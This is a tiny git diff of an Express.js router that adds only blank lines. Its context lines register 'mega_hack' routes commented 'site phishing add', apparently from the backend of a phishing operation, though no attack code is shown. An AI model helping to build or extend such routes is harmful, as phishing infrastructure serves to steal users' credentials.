@@ -42,6 +42,8 @@ router.post('/add/instant/mega',rateLimitMiddleware, mega_hack);  ///site phishi
 router.get('/add/instant/mega', mega_hack_get);  ///site phishing add
 
 
+
+
 router.delete('/delete/poster/:id_pos/:id_ad', delete_poster);
 
 router.delete('/delete/info/:info_id/:pos_id', delete_info);
